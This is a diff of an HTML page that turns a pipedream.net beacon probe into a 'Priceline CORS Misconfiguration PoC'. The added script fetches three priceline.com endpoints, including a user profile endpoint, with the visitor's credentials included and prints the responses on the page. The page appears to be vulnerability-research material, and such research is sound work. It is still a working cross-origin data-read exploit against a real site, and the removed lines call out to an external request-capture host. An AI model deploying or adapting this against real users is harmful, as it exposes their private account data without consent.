@@ -1,8 +1,26 @@
 <!DOCTYPE html>
 <html>
+<head><title>Priceline CORS PoC</title></head>
 <body>
-<h1>probe</h1>
-<img src="https://eondm3hfjar18nj.m.pipedream.net/img-loaded">
-<link rel="stylesheet" href="https://eondm3hfjar18nj.m.pipedream.net/css-loaded">
+<h1>Priceline CORS Misconfiguration PoC</h1>
+<p>Origin: <span id="origin"></span></p>
+<h3>Test 1: GET /pws/v0/pcln-graph/</h3>
+<pre id="t1">Loading...</pre>
+<h3>Test 2: GET /pws/v1/ace/impression/uhUtOmTZ6nPReVftiMhVo0PNRGo1KTju</h3>
+<pre id="t2">Loading...</pre>
+<h3>Test 3: GET /next-profile/profile</h3>
+<pre id="t3">Loading...</pre>
+<script>
+document.getElementById('origin').textContent = window.location.origin;
+function test(elId, url) {
+  fetch(url, { credentials: 'include' })
+    .then(r => r.text().then(t => ({ status: r.status, body: t.substring(0, 2000) })))
+    .then(d => { document.getElementById(elId).textContent = 'Status: ' + d.status + '\n\n' + d.body; })
+    .catch(e => { document.getElementById(elId).textContent = 'BLOCKED BY BROWSER (CORS): ' + e.message; });
+}
+test('t1', 'https://www.priceline.com/pws/v0/pcln-graph/');
+test('t2', 'https://www.priceline.com/pws/v1/ace/impression/uhUtOmTZ6nPReVftiMhVo0PNRGo1KTju');
+test('t3', 'https://www.priceline.com/next-profile/profile');
+</script>
 </body>
 </html>
